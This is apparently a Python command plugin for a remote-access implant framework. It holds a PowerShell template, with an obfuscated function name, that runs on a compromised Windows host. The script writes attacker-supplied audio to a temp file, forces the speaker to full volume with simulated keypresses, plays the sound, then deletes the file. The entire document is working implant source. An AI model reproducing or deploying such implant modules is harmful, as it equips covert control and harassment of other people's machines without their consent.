class PlayAudio:
    type = "PS"
    args = "Local sound file location"
    input = "play_audio"

    def process_implant_response(self, data, args):
        return f"Audio success: {args}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_remote_play_audio }}($data){
    if ($data.length -lt 4){
            $Script:tr = "1"
        }
    $file = "dev_temp_name"
    $t = "$env:TMP/$file.mp3"
    $data | Set-Content "$t" -encoding Byte -NoNewLine

    Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}}
    Set-Speaker -Volume 50

    Add-Type -AssemblyName presentationCore
    $mediaPlayer = New-Object system.windows.media.mediaplayer
    $mediaPlayer.Volume = 1
    $mediaPlayer.Open("$t")
    $duration = 2
    $duration = $duration + $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
    $mediaPlayer.Play()
    #$duration = $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
    sleep($duration)
    $mediaPlayer.Close()
    Remove-Item -Confirm:$false "$t"
    $Script:tr = "Audio success."
    return
}


'''
        return var
